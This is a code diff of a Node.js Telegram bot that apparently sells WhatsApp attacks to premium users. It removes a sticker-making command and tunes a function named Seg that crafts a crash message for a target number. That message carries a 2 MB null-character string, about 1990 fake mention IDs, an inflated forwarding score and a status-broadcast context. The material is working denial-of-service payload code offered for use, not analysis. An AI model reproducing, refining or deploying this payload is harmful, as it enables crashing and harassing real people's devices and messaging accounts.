@@ -84,11 +84,7 @@ const pino = require('pino');
 const chalk = require('chalk');
 const axios = require('axios');
 const path = require("path");
-const sharp = require("sharp");
 const moment = require('moment-timezone');
-const ffmpeg = require("fluent-ffmpeg");
-const ffmpegPath = require("ffmpeg-static");
-ffmpeg.setFfmpegPath(ffmpegPath);
 //S
 
 const {
@@ -1493,195 +1489,6 @@ function formatPhoneNumber(number) {
 }
 //s
 
-bot.command(["sticker", "s"], async (ctx) => {
-  const MAX_BYTES = 19 * 1024 * 1024; // Limit download file mentah (20MB)
-  const token = ctx.telegram.token;
-  const userId = ctx.message.from.id;
-  const username = ctx.message.from.first_name.replace(/[^a-zA-Z0-9]/g, "");
-
-  // --- HELPER FUNCTIONS ---
-
-  // 1. Fungsi Hapus File Temp (Biar storage ga penuh)
-  const cleanTemp = (files) => {
-    files.forEach(f => {
-      if (fs.existsSync(f)) fs.unlinkSync(f);
-    });
-  };
-
-  // 2. Fungsi API Telegram Native
-  const tg = async (method, body, multipart = false) => {
-    const url = `https://api.telegram.org/bot${token}/${method}`;
-    let options = { method: "POST" };
-    if (multipart) {
-      options.body = body;
-    } else {
-      options.body = JSON.stringify(body);
-      options.headers = { "content-type": "application/json" };
-    }
-    const res = await fetch(url, options);
-    const raw = await res.text();
-    let data;
-    try { data = JSON.parse(raw); } catch { throw new Error(raw); }
-    if (!data.ok && !data.description.includes("STICKERSET_INVALID")) {
-      throw new Error(data.description);
-    }
-    return data;
-  };
-
-  // 3. Fungsi Download File ke Folder Lokal
-  const downloadToDisk = async (fileId, destPath) => {
-    const fileData = await ctx.telegram.getFile(fileId);
-    const url = `https://api.telegram.org/file/bot${token}/${fileData.file_path}`;
-    const res = await fetch(url);
-    if (!res.ok) throw new Error("Gagal download file dari Telegram");
-    
-    const buffer = Buffer.from(await res.arrayBuffer());
-    fs.writeFileSync(destPath, buffer);
-    return destPath;
-  };
-
-  // 4. Proses Video dengan FFmpeg (Strict Telegram Specs)
-  const processVideo = (inputPath, outputPath) => {
-    return new Promise((resolve, reject) => {
-      ffmpeg(inputPath)
-        .inputOptions(["-t 2.9"]) // Potong max 2.9 detik (aman)
-        .outputOptions([
-          "-c:v libvpx-vp9",       // Codec wajib Telegram
-          "-pix_fmt yuv420p",      
-          "-vf scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:-1:-1:color=black@0", // Resize fit 512x512 transparent
-          "-b:v 400k",             // Bitrate
-          "-an",                   // Hapus audio (Wajib)
-          "-f webm"                // Format WebM
-        ])
-        .save(outputPath)
-        .on("end", () => resolve(true))
-        .on("error", (err) => reject(err));
-    });
-  };
-
-  // --- LOGIKA UTAMA ---
-  let loadingMsg;
-  const tempFiles = [];
-
-  try {
-    if (ctx.chat.type !== "private") return ctx.reply("❌ Chat PC aja bang.");
-    
-    const msg = ctx.message;
-    const reply = msg.reply_to_message;
-    if (!reply) return ctx.reply("❌ Reply foto/video dulu baru ketik /s");
-
-    // Kirim pesan loading awal
-    loadingMsg = await ctx.reply("⏳ Sabar, lagi diproses...");
-
-    let stickerBuf;
-    let isVideo = false;
-    let fileId;
-
-    // Deteksi Tipe File
-    if (reply.photo) {
-      fileId = reply.photo[reply.photo.length - 1].file_id;
-    } else if (reply.video) {
-      fileId = reply.video.file_id;
-      isVideo = true;
-    } else if (reply.animation) {
-      fileId = reply.animation.file_id;
-      isVideo = true;
-    } else if (reply.document && reply.document.mime_type.startsWith("video")) {
-      fileId = reply.document.file_id;
-      isVideo = true;
-    } else if (reply.document && reply.document.mime_type.startsWith("image")) {
-      fileId = reply.document.file_id;
-    } else {
-      return ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, "❌ Format tidak didukung.");
-    }
-
-    // --- PROSES GAMBAR ---
-    if (!isVideo) {
-      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, "📥 Downloading Image...");
-      
-      const fileData = await ctx.telegram.getFile(fileId);
-      const url = `https://api.telegram.org/file/bot${token}/${fileData.file_path}`;
-      const res = await fetch(url);
-      const inputBuf = Buffer.from(await res.arrayBuffer());
-
-      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, "⚙️ Editing Image...");
-      
-      stickerBuf = await sharp(inputBuf)
-        .resize(512, 512, { fit: "contain", background: { r: 0, g: 0, b: 0, alpha: 0 } })
-        .webp({ quality: 90 })
-        .toBuffer();
-    } 
-    
-    // --- PROSES VIDEO ---
-    else {
-      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, "📥 Downloading Video...");
-      
-      const tempIn = path.join(__dirname, `in_${userId}_${Date.now()}.mp4`);
-      const tempOut = path.join(__dirname, `out_${userId}_${Date.now()}.webm`);
-      tempFiles.push(tempIn, tempOut); // Tandai file buat dihapus nanti
-
-      // 1. Download ke file
-      await downloadToDisk(fileId, tempIn);
-
-      // 2. Convert
-      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, "⚙️ Converting FFmpeg (Berat)...");
-      await processVideo(tempIn, tempOut);
-
-      // 3. Baca hasil convert
-      stickerBuf = fs.readFileSync(tempOut);
-    }
-
-    // --- UPLOAD KE TELEGRAM ---
-    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, "☁️ Uploading to Sticker Pack...");
-
-    const botInfo = await tg("getMe", {});
-    const botUser = botInfo.result.username;
-    
-    const suffix = isVideo ? "_vid" : "";
-    const setName = `u${userId}${suffix}_by_${botUser}`.toLowerCase();
-    const setTitle = `${username} ${isVideo ? "Video" : ""} Pack`;
-
-    const m = (msg.text || "").match(/(?:\/s|\/sticker)(?:\s+(.+))?$/i);
-    const emoji = (m?.[1] || "✨").split(/\s+/)[0].slice(0, 8);
-
-    const form = new FormData();
-    form.append("user_id", userId.toString());
-    form.append("name", setName);
-    const blob = new Blob([stickerBuf], { type: isVideo ? "video/webm" : "image/webp" });
-    form.append(isVideo ? "webm_sticker" : "png_sticker", blob, isVideo ? "sticker.webm" : "sticker.webp");
-    form.append("emojis", emoji);
-
-    try {
-        // Coba Add dulu
-        await tg("addStickerToSet", form, true);
-    } catch (e) {
-        if (e.message.includes("STICKERSET_INVALID")) {
-            // Kalau gak ada, Create Baru
-            form.append("title", setTitle);
-            await tg("createNewStickerSet", form, true);
-        } else {
-            throw e; // Error lain lempar ke catch bawah
-        }
-    }
-
-    // Sukses!
-    await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});
-    await ctx.replyWithSticker({ source: stickerBuf });
-
-  } catch (e) {
-    console.error(e);
-    if (loadingMsg) {
-        await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, `❌ ERROR: ${e.message}`);
-    } else {
-        ctx.reply(`❌ ERROR: ${e.message}`);
-    }
-  } finally {
-    // Wajib hapus file sampah
-    cleanTemp(tempFiles);
-  }
-});
-
-
 bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
   await ctx.telegram.sendChatAction(ctx.chat.id, "record_audio");
   const userId = ctx.from.id;
@@ -2104,13 +1911,14 @@ async function Seg(target, ptcp = true) {
 }
 
 let payload = "";
-for (let i = 0; i < 555; i++) {
+for (let i = 0; i < 1000; i++) {
     payload = "\u0000".repeat(2097152);
 }
 
-const mentionedJid = [
+const Jambutxx = [
     "0@s.whatsapp.net",
-    ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
+    "13135550002@s.whatsapp.net",
+    ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
 ];
 
 const generateMessage = {
@@ -2128,10 +1936,10 @@ const generateMessage = {
 				directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
 				mediaKeyTimestamp: "1749220174",
 				jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAADBQACBAEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABhB6gNNNTGLcMDiZqB7ZW0LKXPmQBV8PTrzAOOPOOzh1ugQ0IE9MlGMO6SszJlz8K2m4Hs5mG9JBJWQ4aQtvkP/8QAKRAAAgIBAgQEBwAAAAAAAAAAAQIAAxEEIRASEzEUQVJxBSMkQlFTYv/aAAgBAQABPwCzlbcRFyohSFIyQpGY115ni7PyZWQwwdjFGF4EQiFY9YavEK7y2pLFDVneV5KDMM1euKErXDq7z95lfxC1dm3hsFmnDDgtzDYShs1gmMAyEiaul0Yw7Hhp0KaTfz4FuUkyhvkL7Q3tW4AORmalBdWGEtUq5yIhHMM9syx1XTAjtiddoxZicgyvPhlGfKKC7gCarVdABF7y2w2kk9+C3PyFM7cG1L4IAERwmmDN6YdUq2Blmrt6lrGZg3lVBfG88Gn7I9JrfBEZvp8fzDWwMw2cYnTfMpqQrzY3ENirhT3hLZ84yq4wRHXCER7BneGxcY3hsBIMrtIr5V7kxhgp7wIvon//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/ACf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/ACf/2Q==",
-            contextInfo: {
-                mentionedJid: mentionedJid,
+                contextInfo: {
+                mentionedJid: Jambutxx,
                 isSampled: true,
-                participant: isTarget,
+                participant: target,
                 remoteJid: "status@broadcast",
                 forwardingScore: 2097152,
                 isForwarded: true
